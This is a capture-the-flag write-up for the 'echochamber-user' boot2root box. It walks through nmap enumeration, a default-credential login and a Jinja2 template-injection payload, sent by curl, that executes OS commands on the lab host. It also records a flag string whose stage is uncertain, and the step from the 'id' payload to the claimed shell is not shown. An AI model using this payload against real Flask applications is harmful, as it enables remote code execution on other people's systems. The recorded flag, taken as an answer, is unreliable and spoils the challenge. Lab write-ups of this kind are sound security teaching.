# echochamber-user -- boot2root

**Tools:** nmap, curl, netcat reverse shell, manual Flask/Jinja2 SSTI
**Scripts:** No original script survived the session's ephemeral scratchpad; the method below is a
faithful reconstruction from the session transcript, not a recovered file.
**Flag:** `isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck} (unconfirmed which stage this belongs to -- see note above)`

## Enumeration

CryoVault 2026's TryHackMe-delivered box ("Cryovault 2026 3"). Initial scan:

    nmap -sC -sV -oN initial.nmap 10.49.151.46

Only two ports open: SSH (22, dead end without creds) and HTTP (80, nginx) hosting an "Anadyne
Console" login page, which handed out default credentials (analyst/analyst) directly on the page,
plus a footer hint: "keystroke telemetry via libechotap.so is enabled on this workstation."

## Analysis

Logged in with analyst/analyst:

    curl -s -i -c cookies.txt -X POST http://10.49.151.46/login -d "username=analyst&password=analyst"

The session cookie was a Flask itsdangerous-signed cookie decoding to `{"user":"analyst"}`. The
`/api/alert/preview` endpoint rendered user-supplied JSON "Markdown-ish" content -- a classic
`render_template_string(user_input)` SSTI setup. Confirmed with:

    curl -s -b cookies.txt -X POST http://10.49.151.46/api/alert/preview \
      -H "Content-Type: application/json" -d '{"title":"test","body":"{{7*7}}"}'
    -> {"html":"<h2>test</h2>\n<div class='preview-body'>49</div>","ok":true}

## Exploit

Escalated the confirmed SSTI directly to RCE (no gadget chain needed):

    curl -s -b cookies.txt -X POST http://10.49.151.46/api/alert/preview \
      -H "Content-Type: application/json" \
      -d '{"title":"test","body":"{{ self.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read() }}"}'

Got a shell as `analyst` (uid=1001, group `echo-log`) and stabilised it (`stty raw -echo; fg`).
This is the user-level foothold; see [`echochamber-root`](../echochamber-root) for the
privilege-escalation chain that reads `user.txt`/`root.txt` via the sentinel daemon.

## Verification

Note: only one flag string was pasted back into this session's transcript at the very end of the
root-level exploit chain (a single request happened to read both `user.txt` and `root.txt` at
once). It's not possible to say from this session alone which of the two CTFd entries
(`echochamber-user` vs `echochamber-root`) that recorded string corresponds to -- see
[`echochamber-root`](../echochamber-root) for the one flag text that was actually captured.
